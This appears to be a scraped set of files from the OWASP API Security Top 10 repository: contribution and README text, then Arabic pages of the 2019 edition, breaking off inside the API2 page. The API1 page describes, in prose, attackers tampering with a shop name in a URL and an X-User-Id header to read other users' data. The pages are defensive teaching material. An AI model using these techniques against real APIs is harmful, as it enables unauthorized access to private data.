{"source": "github", "repo": "OWASP/API-Security", "file": "CONTRIBUTING.md", "url": "https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md", "content": "# How to Contribute\n\nWhen contributing to this repository, please first discuss the change you wish\nto make via submitting an issue with the owners of this repository before making\na change. Fixing typos or rephrasing for better understanding DO NOT require\ndiscussion.\n\n## Branching Model\n\nThis repository holds two main branches with an infinite lifetime:\n\n* `master` is the default branch which always reflects the latest release.\n* `develop` is the main branch reflecting the latest delivered changes for the\n  next release. When the `develop` branch reaches a stable point and is ready to\n  be released, then all changes should be merged back into `master`.\n\nA variety of supporting branches are used to aid parallel development. These\nbranches have a limited lifespan, since they will be removed eventually.\n\n## Contributing\n\nContributions to this repository are welcome. For ease of managing, please\nfollow the steps below:\n\n1.  Fork this repository to your account.\n\n2.  Clone your copy of this repository, locally.\n\n    ```\n    git clone https://github.com/YOU/API-Security.git\n    ```\n\n3.  Create a new branch based on `develop` (e.g., `fix/foreword-section`).\n\n    ```\n    git checkout develop && git checkout -b fix/foreword-section\n    ```\n\n4.  Apply your changes.\n\n    Please, always follow our style conventions.\n\n\n    Although there's an [`.editorconfig` file][1] on repository's root, your\n    editor may not support it. To learn more about [EditorConfig][2] and text\n    editors/IDEs support, check the website: https://editorconfig.org/.\n    You can preview your changes, [rendering the web site locally][4].\n\n5.  Commit your changes.\n\n    1.  Check modified files and add only required ones (e.g., build artifacts\n        SHOULD NOT be tracked).\n    2.  The first line of the commit message should provide a brief description\n        of your changes. You can go into more details on the optional commit\n        message body.\n\n6.  Push changes to your public repository.\n\n    ```\n    git push origin fix/foreword-section\n    ```\n\n7.  Open a Pull Request from your `fix/foreword-section` to the upstream\n    repository `develop` branch.\n\n### Rendering the Web Site Locally\n\nThe web site is built using [Material for MkDocs][3] and several plugin.\nAlthough you can manually install everything, we've bundled everything into a\nDocker image that you can use to render the web site locally:\n\n```\ndocker compose up\n```\n\n[1]: https://github.com/OWASP/API-Security/blob/master/.editorconfig\n[2]: https://editorconfig.org/\n[3]: https://squidfunk.github.io/mkdocs-material/\n[4]: #rendering-the-web-site-locally\n", "timestamp": "2025-10-24T22:26:10.938075"}
{"source": "github", "repo": "OWASP/API-Security", "file": "README.md", "url": "https://github.com/OWASP/API-Security/blob/master/README.md", "content": "# OWASP API Security Top 10\n\nThis project is designed to address the ever-increasing number of organizations\nthat are deploying potentially sensitive APIs as part of their software\nofferings. These APIs are used for internal tasks and to interface with third\nparties. Unfortunately, many APIs do not undergo the rigorous security testing\nthat would help make them secure from an attack.\n\nThe OWASP API Security Project seeks to provide value to software developers and\nsecurity assessors by underscoring the potential risks in insecure APIs, and\nillustrating how these risks may be mitigated. In order to facilitate this goal,\nthe OWASP API Security Project will create and maintain a Top 10 API Security\nRisks document, as well as a documentation portal for best practices when\ncreating or assessing APIs.\n\n## Description\n\nWhile working as developers or information security consultants, many people\nhave encountered APIs as part of a project. While there are some resources to\nhelp create and evaluate these projects (such as the OWASP REST Security Cheat\nSheet), there has not be a comprehensive security project designed to assist\nbuilders, breakers, and defenders in the community.\n\nThis project aims to:\n\n* Create the OWASP Top Ten API Security Risks document, which can easily\n  underscore the most common risks in the area.\n* Create a documentation portal for developers to build APIs in a secure manner.\n* Work closely with the security community to maintain living documents that\n  evolve with security trends.\n\n## Project Leaders\n\n* [Erez Yalon][0]\n* [Inon Shkedy][5]\n* [Paulo Silva][6]\n\n## Licensing\n\n**The OWASP API Security Project documents are free to use!**\n\nThe OWASP API Security Project is licensed under the [Creative Commons\nAttribution-ShareAlike 4.0 license][1], so you can copy, distribute, and\ntransmit the work. You can also adapt it, and use it commercially, as long as\nyou attribute the work. If you alter, transform, or build upon this work, you\nmay distribute the resulting work only under the same or similar license to this\none.\n\n[0]: https://www.owasp.org/index.php/User:ErezYalon\n[1]: http://creativecommons.org/licenses/by-sa/4.0/\n[2]: https://github.com/OWASP/API-Security/blob/develop/2019/en/dist/owasp-api-security-top-10.pdf\n[3]: https://github.com/OWASP/API-Security/tree/develop/\n[4]: https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n[5]: https://www.owasp.org/index.php/User:Inon\n[6]: mailto:paulo.silva@owasp.org\n[cfd-2022]: https://owasp.org/www-project-api-security/announcements/cfd/2022/\n\n", "timestamp": "2025-10-24T22:26:11.944022"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0x00-header.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0x00-header.md", "content": "---\ntitle: ''\n---\n\n![OWASP LOGO](./images/owasp-logo.png)\n\n# OWASP API Security Top 10 2019\n\n  أهم عشرة مخاطر أمنية تستهدف واجهة برمجة التطبيقات (API)\n\n  19 مايو 2019\n\n![WASP Logo URL TBA](images/front-wasp.png)\n\n| | | |\n| - | - | - |\n| https://owasp.org | هذا العمل يخضع لترخيص [Creative Commons Attribution-ShareAlike 4.0 International License][1] | ![Creative Commons License Logo](images/front-cc.png) |\n\n[1]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:15.290521"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0x00-notice.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0x00-notice.md", "content": "# تنوية\n\nهذه هي النسخة النصية من مستند OWASP API Security Top 10 و يتم استخدام النسخة القابلة للتوزيع على هيئة ملف PDF \n\n للمساهمة في هذا المشروع من تعليقات او تصحيح للمفاهيم او الترجمة يجب ان يتم هنا في مشروع GitHub  وللحصول على المزيد من التفاصيل قم بزيارة  قسم المشاركة. \n\n * Erez Yallon\n * Inon Shkedy\n\n[1]: ../../CONTRIBUTING.md\n", "timestamp": "2025-10-24T22:26:15.402139"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0x00-toc.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0x00-toc.md", "content": "# جدول المحتويات\n\n* [محتوى الوثيقة](0x00-toc.md)\n* [عن منظمة أواسب](0x01-about-owasp.md)\n* [تمهيد](0x02-foreword.md)\n* [مقدمة](0x03-introduction.md)\n* [عن النسخة](0x04-release-notes.md)\n* [المخاطر الأمنية على واجهة التطبيقات API](0x10-api-security-risks.md)\n* [أهم عشرة مخاطر أمنية لواجهة برمجة التطبيقات API](0x11-t10.md)\n* [API1:2019 خلل التفويض والصلاحيات](0xa1-broken-object-level-authorization.md)\n* [API2:2019 خلل في صلاحيات المستخدم](0xa2-broken-user-authentication.md)\n* [API3:2019  خلل في استعراض البيانات](0xa3-excessive-data-exposure.md)\n* [API4:2019  ضعف في البنية التحتية و حد محاولات الطلبات](0xa4-lack-of-resources-and-rate-limiting.md)\n* [API5:2019 خلل في مستوى الصلاحيات والتفويض](0xa5-broken-function-level-authorization.md)\n* [API6:2019  خلل في التعين أو التعديل](0xa6-mass-assignment.md)\n* [API7:2019 الإعداد الخاطئ](0xa7-security-misconfiguration.md)\n* [API8:2019  الحقن](0xa8-injection.md)\n* [API9:2019  خلل في إدارة الأصول](0xa9-improper-assets-management.md)\n* [API10:2019  خلل في طريقة تسجيل الأحداث والمراقبة](0xaa-insufficient-logging-monitoring.md)\n* [ماهو التالي للمطورين](0xb0-next-devs.md)\n* [أفضل الممارسات للتطوير بشكل آمن](0xb1-next-devsecops.md)\n* [المنهجية والبيانات](0xd0-about-data.md)\n* [الإقرار](0xd1-acknowledgments.md)\n", "timestamp": "2025-10-24T22:26:15.506978"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0x01-about-owasp.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0x01-about-owasp.md", "content": "# عن منظمة أواسب\n\nهو مشروع/مجتمع لأمن تطبيقات الويب مفتوح المصدر يهدف إلى تمكين المؤسسات من تطوير أو شراء أو صيانة تطبيقاتها بشكل آمن و موثوق.\n\n\n في مجتمع OWASP ستجد: \n\n* معايير و أدوات التطبيقات الآمنة\n* كتب ومراجع كاملة عن اختبار تطبيقات الويب و التطوير الآمن ومراجعة الشفرة المصدرية\n* [العروض التقديمية][1]\n* [ملخصات][2] في العديد من المواضيع\n* مكتبة المعايير الأمنية والضوابط\n* [الفروع المحلية حول العالم][3]\n* البحوث\n* [المؤتمرات حول العالم][4]\n* [القائمة البريدية][5]\n\n\nتعرف على المزيد:   https://www.owasp.org\n\n إن جميع الأدوات والوثائق والمنتديات والمنظمات الفرعية لمنظمة (أواسب) هي مجانية ومفتوحة لجميع المهتمين بتطوير أمن التطبيقات. نقدم أمن التطبيقات كمشكلة تتضمن العامل البشري، والإجراءات، والتقنية؛ وذلك لأن أفضل الأساليب فعالية في أمن التطبيقات تتطلب تحسين جميع هذه المجالات الثلاثة.\n\n (أواسب) هي منظمة فريدة من نوعها. حريتنا من الضغوط التجارية تسمح لنا بتقديم معلومات عن أمن التطبيقات غير متحيزة وعملية وفعالة من ناحية التكلفة. إن (أواسب) لا تتبع أي شركة تجارية، مع أننا ندعم الاستخدام الواعي للتقنيات الأمنية التجارية. على غرار الكثير من مشاريع البرمجيات مفتوحة المصدر، فإن (أواسب) تقدم أنواع كثيرة من المواد بشكل تعاوني ومفتوح.\n\n مؤسسة (أواسب) هي منشأة غير ربحية تضمن النجاح المستمر للمشروع. تقريبًا،  جميع المنتسبين إلى (أواسب) هم من المتطوعين بمن فيهم أعضاء المجلس، واللجان العالمية، وقادة المنظمات الفرعية، وقادة المشاريع وأعضائها. نحن ندعم الأبحاث الأمنية الإبداعية بالمنح وتوفير البنية التحتية.\n\n\nانضم إلينا!\n\n\n## حقوق النشر والتراخيص  \n\n![license](images/license.png)\n\nحقوق الطبع محفوظة لمنظمة أواسب 2003 - 2019  تم نشر هذه الوثيقة تحت رخصة المشاع الإبداعي Creative Common  خواص النسبة والترخيص بالمثل الإصدار .4.0 لأي إعادة استخدام أو توزيع، عليك بيان وتوضيح شروط وأحكام الرخصة للطرف الآخر.\n\n[1]: https://www.youtube.com/user/OWASPGLOBAL\n[2]: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[3]: https://www.owasp.org/index.php/OWASP_Chapter\n[4]: https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[5]: https://lists.owasp.org/mailman/listinfo\n[6]: https://www.owasp.org\n[7]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:15.619970"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0x02-foreword.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0x02-foreword.md", "content": "# مقدمة\n\nتعتبر واجهة برمجة التطبيقات (API) أحد العناصر الأساسية للابتكار في عالم التطبيقات، حيث نجدها في التطبيقات البنكية وتجارة التجزئة والنقل وصولاً إلى إنترنت الأشياء والمركبات ذاتية القيادة والمدن الذكية. كما تعد واجهات برمجة التطبيقات (API) جزءًا مهمًا من التطبيقات وخصوصًا الخاصة بالهواتف المحمولة الحديثة والبرمجيات كخدمة SaaS وتطبيقات الويب، بالإضافة لاستخدامها في تطبيقات المستخدمين والشركاء والتطبيقات الداخلية. \n\nولأن طبيعة عمل واجهة برمجة التطبيقات (API) يؤدي لاستعراض بعض المعلومات الحساسة أو الشخصية، نجد أنها تعتبر هدف أساسي للمهاجمين وبشكل متزايد. لذلك عدم تأمين البيئة الخاصة بواجهة برمجة التطبيقات (API) سيؤدي إلى الحد من التطوير السريع للبرمجيات. \n\nعلى الرغم من وجود مخاطر متعددة على تطبيقات الويب والتي تم نشرها في وثيقة مستقلة بعنوان أعلى عشر مخاطر (OWASP TOP 10) تستهدف لتطبيقات الويب، وبالإضافة لذلك فإن المخاطر التي تستهدف واجهة برمجة تطبيقات الويب (API) لا تقل أهمية عنها بل يستوجب علينا التركيز عليها لإيجاد حلول استراتيجية مستدامة من شأنها تخفيف المخاطر ونقاط الضعف المرتبطة مع واجهة برمجة التطبيقات. \n\nإذا كنت معتادًا على مشروع OWASP Top 10، فستلاحظ أوجه التشابه بين كلا المستندين: إنهما مخصصان للقراء والاعتماد. أما إذا كنت جديدًا في سلسلة OWASP Top 10، فقد يكون من الأفضل لك قراءة أقسام مخاطر الأما والمنهجية والبيانات الخاصة بواجهة برمجة التطبيقات (API) قبل الانتقال إلى قائمة المخاطر 10 هنا.\n\nيمكنك المساهمة في OWASP API Security Top 10 بأسئلتك وتعليقاتك وأفكارك في مستودع مشروع GitHub: \n \n * https://github.com/OWASP/API-Security/issues\n * https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n\nتستطيع الوصول إلى الوثيقة OWASP API Security Top 10 من هنا: \n* https://www.owasp.org/index.php/OWASP_API_Security_Project\n* https://github.com/OWASP/API-Security\n\nنود أن نشكر جميع المساهمين الذين جعلوا هذا المشروع متوفر لكم على جهودهم ومساهماتهم، حيث تم سردها جميعًا في [قسم الشكر والتقدير][4]. شكرا لكم!\n\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd0-about-data.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:15.763301"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0x03-introduction.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0x03-introduction.md", "content": "# مدخل\n\n## مرحبًا بك في أهم عشرة مخاطر أمنية تستهدف واجهة برمجة التطبيقات (API)\n\nمرحبًا بك في الإصدار الأول من OWASP API Security Top 10. إذا كنت على دراية بسلسلة OWASP Top 10، ستلاحظ أوجه التشابه بينهم: حيث نوصي بقراءة OWASP Top 10 قبل الشروع في قراءة هذا المحتوى. \n\nتلعب واجهات برمجة التطبيقات (API) دورًا مهمًا جدًا في هندسة التطبيقات الحديثة. وعلى الرغم من أن رفع الوعي  لأمني في البرمجة الآمنة والابتكار لهما خطوات مهمة ومختلفة، فمن المهم التركيز على نقاط الضعف الأمنية  الشائعة لواجهة برمجة التطبيقات (API). \n\nالهدف الأساسي من وثيقة أهم عشرة مخاطر تستهدف واجهات برمجة التطبيقات API، هو زيادة الوعي للمشاركين في تطوير صيانة واجهة برمجة التطبيقات API كالمطورين، المصممين، مهندسي البنية التحتية، المدراء و المؤسسات. \n\nفي [قسم المنهجية والبيانات][2]، يمكنك قراءة المزيد حول كيفية إنشاء الإصدار الأول وما هو المتوقع من الإصدارات المستقبلية، حيث نهدف إلى تمكين صناعة الأمن في برمجة واجهة التطبيقات API، كما نشجع الجميع على المساهمة في طرح الأسئلة والتعليقات والأفكار من خلال [مخزننا على GitHub][3] أو [القائمة البريدية][4]. \n\n[1]: https://www.owasp.org/index.php/OWASP_API_Security_Project\n[2]: ./0xd0-about-data.md\n[3]: https://github.com/OWASP/API-Security\n[4]: https://groups.google.com/a/owasp.org/forum/#!forum/api-security-project\n", "timestamp": "2025-10-24T22:26:15.873240"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0x04-release-notes.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0x04-release-notes.md", "content": "# ملاحظات عن الإصدار\n\nهذا هو الإصدار الأول من OWASP API Security Top 10، والذي نخطط لتحديثه بشكل دوري كل ثلاث أو أربع سنوات. \n\nعلى عكس هذا الإصدار، في الإصدارات المستقبلية سنقوم بدعوة عامة للمشاركة في هذا التحديث لتمكين صناعة تطبيقات منة بجهود مشتركة. في قسم [المنهجية والبيانات][1] ستجد المزيد من التفاصيل حول طريقة كتابة هذا الإصدار. لمزيد من  لتفاصيل حول مخاطر الأمان، يرجى الرجوع إلى [قسم مخاطر أمان واجهة برمجة التطبيقات (API)][2]. \n\nمن المهم أن ندرك بأنه على مدى السنوات القليلة الماضية قد تغيرت بنية التطبيقات بشكل كبير. حيث تلعب واجهات  رمجة التطبيقات (API) في الوقت الحالي دورًا مهمًا للغاية في هذه البنية الجديدة للخدمات المصغرة وتطبيقات لدخول ذات الصفحة الواحدة (SPA) وتطبيقات الأجهزة المحمولة وإنترنت الأشياء وما إلى ذلك. \n\n إن بناء  OWASP API Security Top 10 يحتاج إلى جهد كبير بهدف خلق الوعي حول مشكلات أمان API الحديثة. نكرر  [لشكر لجميع المتطوعين في إنشاء هذه الوثيقة][3] والذين تم إدراجهم في قسم الشكر والتقدير.  \n   \n\n شكرًا لك! \n\n[1]: ./0xd0-about-data.md\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:15.972477"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0x10-api-security-risks.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0x10-api-security-risks.md", "content": "# مخاطر برمجة واجهة التطبيقات\n\n* تم استخدام [ نموذج تقييم المخاطر الخاص بـ OWASP](0x03-introduction.md) وذلك بهدف تحليل المخاطر.\n\nيلخص الجدول أدناه المصطلحات المرتبطة بدرجة المخاطر.\n\n\n| عوامل التهديد | الاستغلال | نقاط الضعف الأمنية\t | اكتشاف الضعف الأمني\t | التأثيرات التقنية\t | التأثيرات على العمل |\n|---------------|-----------|---------------------|----------------------|--------------------|---------------------|\n| خصائص API     | بسيط 3\t   | منتشرة 3\t           | بسيط 3\t              | حرج 3\t             | تحديد الأعمال       |\n| خصائص API     | متوسط 2\t  | عام 2\t              | متوسط 2\t             | متوسط 2\t           | تحديد الأعمال       |\n| خصائص API     | صعب 1\t    | صعب 1\t              | صعب 1\t               | منخفض              | تحديد الأعمال       |\n\n\n**ملاحظة:**  هذا النهج لا يأخذ في الاعتبار احتمال وجود عامل التهديد، كما أنه لا يأخذ في الحسبان أيًا من التفاصيل الفنية المختلفة المرتبطة بتطبيقك. يمكن لأي من هذه العوامل أن تؤثر بشكل كبير على الاحتمالية الإجمالية للمهاجم  للعثور على ثغرة أمنية معينة واستغلالها. لا يأخذ هذا التصنيف في الاعتبار التأثير الفعلي على عملك، سيتعين على مؤسستك تحديد مقدار المخاطر الأمنية من التطبيقات وواجهات برمجة التطبيقات التي ترغب المؤسسة في قبولها في ضوء البيئة  التنظيمية. الغرض من OWASP API Security Top 10 ليس القيام بتحليل المخاطره  نيابة عنك \n\n\n## المراجع\n\n### أواسب\n* [OWASP Risk Rating Methodology][1]\n* [Article on Threat/Risk Modeling][2]\n\n### الروابط الخارجية\n\n* [ISO 31000: Risk Management Std][3]\n* [ISO 27001: ISMS][4]\n* [NIST Cyber Framework (US)][5]\n* [ASD Strategic Mitigations (AU)][6]\n* [NIST CVSS 3.0][7]\n* [Microsoft Threat Modeling Tool][8]\n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: https://www.owasp.org/index.php/Threat_Risk_Modeling\n[3]: https://www.iso.org/iso-31000-risk-management.html\n[4]: https://www.iso.org/isoiec-27001-information-security.html\n[5]: https://www.nist.gov/cyberframework\n[6]: https://www.asd.gov.au/infosec/mitigationstrategies.htm\n[7]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n[8]: https://www.microsoft.com/en-us/download/details.aspx?id=49168\n", "timestamp": "2025-10-24T22:26:16.076280"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0x11-t10.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0x11-t10.md", "content": "# أهم عشرة مخاطر امنية تستهدف واجهة برمجة التطبيقات (API)\n\n| المخاطر                                                      | الوصف                                                                                                                                                                                                                                                                                                                                                                |\n|--------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| API1:2019 خلل التفويض والصلاحيات                             | تقوم واجهة برمجة التطبيقات API الى كشف بعض المعلومات عن مصدر التعامل مع الطلبات وهو بالعادة يكون (endpoints) التي تتعامل مع الطلبات الناشئة مما قد يؤدي الى مشكلة في التحكم في مستوى صلاحيات الوصول ، حيث يجب ان يكون هناك مستوى صلاحيات محدد ومعرف ومحدود لكل طلب يتم ارساله الى مصدر البيانات بواسطة المستخدمين.                                                   |\n| API2:2019 خلل في صلاحيات المستخدم                            | غالبًا ما يتم تنفيذ آليات المصادقة بشكل غير صحيح ، مما يسمح للمهاجمين باختراق معايير المصادقة أو استغلال الثغرات المنطقية في آلية عمل التطبيق مما تسمح له بانتحال هويات المستخدمين الاخرين بشكل مؤقت أو دائم. حيث ان اختراق النظام او آلية تحديد هوية المستخدم هو خطر على API بشكل عام.                                                                               |\n| API3:2019 خلل في استعراض البيانات                            | ان تنصيب التقنيات بدون مراعات تغير الاعدادت الافتراضية التي قد تودي الى الكشف عن خصائص ومعلومات وبيانات هامة ولا يجب الاعتماد باي شكل من الاشكال على عوامل التصفية لدى المستخدم قبل عرضها.                                                                                                                                                                           |\n| API4:2019 ضعف في البنية التحتية و حد محاولات الطلبات         | في كثير من الأحيان ، لا تفرض واجهات برمجة التطبيقات أي قيود على حجم أو عدد الموارد التي يمكن أن يطلبها العميل / المستخدم. ليس فقط يمكن لهذا تأثير على أداء الخادم API، بل قد يؤدي إلى هجمات حجب الخدمة (DoS)، وكذلك يمكن المهاجم من استخدام هجمة كسر كلمات المرور.                                                                                                   |\n| API5:2019 ضعف في التحقق من الهوية وادارة الصلاحيات و التفويض | تميل سياسات التحكم في الوصول المعقد ذات المجموعات والأدوار المختلفة ، والفصل غير الواضح بينهم في الصلاحيات الإدارية والعادية ، إلى عيوب في التفويض والصلاحيات. والتي تمكن المهاجم من استغلال هذا الضعف في الوصول إلى المستخدمين الآخرين و تصعيد الصلاحيات الى صلاحيات إدارية.                                                                                        |\n| API6:2019 خلل في التعين او التعديل                           | يؤدي ادخال البيانات المقدمة من المستخدم على سبيل المثال ادخال البيانات في ملف (Json) دون عوامل تصفية او قوائم فلترة خاصة مبنية على قوائم بيضاء الى خلل في التعديل او التعين والذي يسمح للمهاجمين بقراءة بيانات او طلب معلومات غير مصرح بها.                                                                                                                          |\n| API7:2019 الاعداد الخاطئ                                     | عادة ما يكون الاعدادت الخاطئة او الاعتماد على الاعدادات الافتراضية او الاعدادات و التغيرات الغير مخطط لها مسبقاً او البيانات السحابية الغير مؤمنه او الاخطاء في اعدادات طلبات بروتوكول HTTP او مشاركة الموارد (CORS) او رسائل الخطأ التفصيلية التي تحتوي على معلومات حساسة.                                                                                           |\n| API8:2019 الحقن                                              | تحدث عمليات استغلال الحقن SQL، NoSQL و Command Injection.. الخ عند ارسال معلومات او بيانات او طلبات او اوامر الى المفسر حيث يتم خداع المفسر لطلب وتنفيذ تعليمات او الحصول على بيانات غير مصرح باستخدامها.                                                                                                                                                            |\n| API9:2019 خلل في ادارة الاصول                                | تميل واجهات برمجة التطبيقات API الى الكشف عن مصادر البيانات (Endpoints) مما يجعل عمليات التوثيق في المستندات لجميع التغيرات في غاية الاهمية ويجب الحذر عند اجراءها، حيث ان اعدادت وتنصيب الخوادم بشكل صحيح عند تثبيت API مهم جداً في تقليل الاخطاء التي قد تؤدي الى الكشف عن البيانات على سبيل المثال الاصدار الخاص بـAPI او واجهة معالج الاخطاء الخاصة به.           |\n| API10:2019 خلل في طريقة تسجيل الاحداث والمراقبة              | ان التسجيل الغير صحيح للاحداث و المراقبة لها يؤدي الى ضعف عملية الاستجابة للحوادث، مما يسمح للمهاجم بالعودة مره اخرى او حتى البقاء داخل الشبكة او التنقل داخل الشبكة او الاطلاع و التلاعب و تسريب البيانات حيث تٌظهر معظم الدراسات ان الوقت اللازم لاكتشاف الاختراقات يزيد عن 200 يوم وعادة ما يتم اكتشاف تلك الاختراقات من اطراف خارجية بدلاً من المراقبة بسبب ضعفها. |\n", "timestamp": "2025-10-24T22:26:16.188978"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0xa1-broken-object-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0xa1-broken-object-level-authorization.md", "content": "# API1:2019 خلل التفويض والصلاحيات\n\n| عوامل التهديد/ الاستغلال                                                                                                                                                                                                                                                                                                                                                                                                           | نقاط الضعف                                                                                                                                                                                                                                                                                                                                                                                                   | التأثير                                                                                                                                                                                    |\n|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| خصائص API : قابلية الاستغلال **3**                                                                                                                                                                                                                                                                                                                                                                                                     | الانتشار **3** : قابلية الاكتشاف  **2**                                                                                                                                                                                                                                                                                                                                                                             | التأثر التقني **3** : تأثر الأعمال\t                                                                                                                                                           |\n| يستطيع المهاجم استغلال نقاط الضعف في مصادر البيانات Endpoint المتأثرة بخلل في الصلاحيات من خلال التلاعب او التغير بالمعرف الفريد عند ارسال الطلبات. قد يؤدي كذلك الى الوصول غير المصرح به الى البيانات الحساسة. وتعتبر خلل تفويض الصلاحيات مشكلة شائعة جداً في التطبيقات بسبب عدم إمكانية الخوادم من تتبع العمليات التي يقوم بها المستخدم بشكل كامل. وحيث انه يعتمد بشكل كامل على إيصال كل معرف فريد لمصدر البيانات الذي يطلب منه. | يعتبر هذا الهجوم هو الأكثر شيوعاً على واجهات برمجة التطبيقات API. حيث ان استخدام مثل هذه الاليات شائعة جداً في التطبيقات الحديثة وواسعة الانتشار. حتى وان كانت صلاحيات الوصول في البنية التحتية للتطبيق مبنيه بشكل سليم، فقد ينسى المطورون استخدام تلك الصلاحيات في الوصول الى البيانات الحساسة وقد لا يتم اكتشاف نقاط الضعف المبنية على خلل صلاحيات الوصول من خلال عمليات المسح للبحث عن الثغرات بشكل آلي.\t | يمكن أن يؤدي الوصول غير المصرح به إلى الكشف عن البيانات لأطراف غير مصرح لها أو فقدان البيانات أو التلاعب بها وكذلك يمكن أن يؤدي الوصول غير المصرح به إلى إلى الاستيلاء الكامل على الحساب.\t |\n\n\n\n\n## هل أنا معرض لهذه الثغرة؟\n\nان عمليات إدارة صلاحيات الوصول والتحكم بها عادة يبنى من خلال كتابة الاكواد البرمجية في المقام الأول  بشكل سليم بحيث يستطيع المستخدم الوصول الى البيانات المسموح له بالوصول لها.\nان جميع مصادر البيانات الخاصة بـ API لها معرف وكائن وصلاحيات خاص ومرتبطة بها، وعند وجود أي اجراء على تلك المصادر او الكائنات يجب ان يتم استخدام تلك التصاريح. حيث يتم التحقق من صلاحيات المستخدم الذي قام بعملية تسجيل الدخول ومعرفة إذا كان لدية حق الوصول لأجراء او استعراض او تعديل البيانات. وعادة ما يؤدي الفشل في التحقق من هذه الالية الى الكشف والتعديل عن معلومات وبيانات الغير مصرح به.\n\n\n## امثلة على سيناريوهات الهجوم\n\n### السيناريو الاول\n\nتوفر منصة التجارة الالكترونية مواقع عبر الانترنت (عبارة عن متاجر الالكترونية) خدمة مصادر الربح الخاصة بالمتاجر المستضاف على المنصة، حيث يستطيع المهاجم من خلال عرض مصدر الصفحة معرفة API الذي قام بجلب تلك المعلومات ومعرفة مصدرها على سبيل المثال : `/shops/{shopName}/revenue_data.json`  ومن خلال تلك الطريقة يستطيع المهاجم من الحصول على بيانات الربح لجميع المتاجر المتسضافة في المنصة من خلال  تغير {shopName} في عنوان URL بطريقة غير مصرح بها.\n    \n### السيناريو الثاني\n\nاثناء فحص حركة مرور البيانات من قبل المهاجم، قام بإرسال طلب من نوع PATCH  من خلال بروتوكول HTTP  لاختبار وفحص جميع الردود من قبل الخادم، وبعد عمليات متعددة  قام المهاجم بإرسال طلب من نوع PATCH  وهو احد الطلبات المتعارف عليها في برتوكول HTTP. تتضمن الترويسة الافتراضية التي يستخدمها الطلب هي header X-User-Id: 54796 مما لفت انتباه المهاجم الى تغيرها لي header X-User-Id: 54795 مما سمح للمهاجم بالوصول/و التعديل الغير مصرح به لبيانات مستخدمين اخرين.\n\n### كيف أمنع هذه الثغرة؟\n\n* الاعتماد على سياسة و آلية تخويل لصلاحيات تعتمد على سياسة الاستخدام المقبول والتسلسل الهرمي السهل الواضح.\n* استخدام آلية لتحقق من صلاحيات المستخدم الذي قام بتسجيل الدخول وهل لديه الحق في تنفيذ الإجراءات على السجلات في كل سجل على حدة وبشكل مستقل.\n* يفضل استخدام قيم عشوائية وغير قابلة لتخمين في استخدام GUIDs في السجلات\n* يفضل كتابة معايير لاختبار مدى نضج التفويض والصلاحيات و عدم القيام باى تغييرات قد تؤدى الى وجود ثغرات حتى لا يتم كسر المعايير التى تم كتابتها\n\n\n## المراجع\n\n### المصادر الخارجية\n\n* [CWE-284: Improper Access Control][1]\n* [CWE-285: Improper Authorization][2]\n* [CWE-639: Authorization Bypass Through User-Controlled Key][3]\n\n[1]: https://cwe.mitre.org/data/definitions/284.html\n[2]: https://cwe.mitre.org/data/definitions/285.html\n[3]: https://cwe.mitre.org/data/definitions/639.html\n", "timestamp": "2025-10-24T22:26:16.300144"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ar/0xa2-broken-user-authentication.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ar/0xa2-broken-user-authentication.md", "content": "# API2:2019 خلل في صلاحيات المستخدم\n\n| عوامل التهديد/ الاستغلال                                                                                                                                                                                                                                                                                                                      | نقاط الضعف\t                                                                                                                                                                                                                                                                                                                                                                                                   | التأثير\t                                                                                                                                                                  |\n|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| 